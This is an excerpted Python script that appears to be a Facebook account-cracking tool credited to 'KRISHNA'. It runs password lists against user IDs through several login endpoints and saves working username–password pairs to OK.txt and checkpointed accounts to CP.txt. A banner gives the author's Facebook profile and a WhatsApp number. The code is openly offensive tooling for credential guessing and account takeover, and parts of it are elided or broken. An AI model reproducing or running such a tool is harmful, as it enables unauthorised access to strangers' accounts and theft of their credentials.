...
def main():
            ...
            if key in [""]:
                ...
                time.sleep(0.5)
                os.system('xdg-open https://www.facebook.com/KR1SHNA.KING')
            elif key in ["3", "03"]:
                time.sleep(0.5)
                os.system('xdg-open https://www.facebook.com/groups/1389534811564769/?ref=share')
                os.system('clear')                
            elif key in ["0", "04"]:
                time.sleep(0.5)
                login()
...
class __crack__:
    ...
    def plerr(self):
        ...
        if _jokowi_kontol_ in ('M', 'm'):
            ...
            IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
            print (' [*]=============================================')
            IMTIAZ_AKING(' [1] KR1SHNA Method 1 ')
            IMTIAZ_AKING(' [2] KR1SHNA Method 2  [ Pro ]')
            IMTIAZ_AKING(' [3] KR1SHNA Method 3   ')
            print (' [*]=============================================')
            self.__pler__()
        else:
    ...
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[ KRISHNA ] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                IMTIAZ_AKING('\r\033[1;92m[KRISHNA-OK] %s | %s%s      '%(user,pw,tahun(user)))
                ...
                try:
                    ...
                    IMTIAZ_AKING('\r\033[1;91m[KRISHNA-CP] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                IMTIAZ_AKING('\r\033[1;91m[KRISHNA-CP] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;32m[KRISHNA-OK] %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;92m[KRISHNA-OK] %s | %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
...
banner="""\033[1;31m
   \033[1;37mdb   dD  .d8b.  d8b   db db   db  .d8b.  
   \033[1;31m88 ,8P' d8' `8b 888o  88 88   88 d8' `8b 
   \033[1;37m88,8P   88ooo88 88V8o 88 88ooo88 88ooo88 
   \033[1;31m88`8b   88~~~88 88 V8o88 88~~~88 88~~~88 
   \033[1;37m88 `88. 88   88 88  V888 88   88 88   88 
   \033[1;31mYP   YD YP   YP VP   V8P YP   YP YP   YP 
    \033[1;97m\033[1;41m===[CREADIT] = {MR-Adi} & {SUBHAN}===\033[0m\033[1;93m
\033[1;37m =============================================
    Author   : KRISHNA
    Facebook : /KR1SHNA.KING
    Connect WHATSAPP  : +16396389163
\033[1;37m =============================================
...
def sep():
    ...
    print ('\033[1;37m Example AKING.txt')
